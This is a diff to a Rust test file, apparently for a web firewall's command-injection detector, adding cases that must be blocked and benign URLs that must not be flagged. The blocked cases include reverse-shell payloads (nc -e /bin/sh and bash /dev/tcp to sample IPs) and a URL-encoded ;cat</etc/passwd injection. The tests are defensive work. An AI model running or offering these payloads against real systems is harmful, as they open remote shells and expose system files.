@@ -102,6 +102,15 @@ fn command_injection_obfuscated_forms_blocked() {
         "quote-obfuscated cat"
     );
     assert!(blocked_body(&e, "cmd=/bin/sh -i"), "/bin/sh -i");
+    // A flag after whitespace, and a redirect with none, are still commands.
+    assert!(
+        blocked_body(&e, "x=a; nc -e /bin/sh 10.0.0.1 4444"),
+        "; nc -e"
+    );
+    assert!(
+        blocked_query(&e, "http://x/p?f=a%3Bcat%3C/etc/passwd"),
+        ";cat</etc/passwd"
+    );
     assert!(
         blocked_body(&e, "x=bash -i >& /dev/tcp/1.2.3.4/9001 0>&1"),
         "bash -i"
@@ -118,6 +127,11 @@ fn benign_values_not_flagged_by_cmdi_rules() {
         "http://x/p?path=/home/user/documents/report.pdf",
         "http://x/p?msg=please%20sleep%20well%20and%20call%20me",
         "http://x/p?q=how%20to%20install%20python%20on%20linux",
+        // A verb immediately followed by `=` or `-` is a key or a word, not a
+        // command (open-appsec real-traffic false positives, 2026-10-12).
+        "http://x/ddm/activity/src=8421;type=invmedia;cat=fl0;ord=1",
+        "http://x/p?url=https%3A%2F%2Fshop.example%2Fa%3B%20nc-sale",
+        "http://x/p?tags=a%3Bcat%3Dshoes",
     ] {
         let mut ctx = make_get_ctx(uri);
         eval(&e, &mut ctx, Phase::RequestBody);
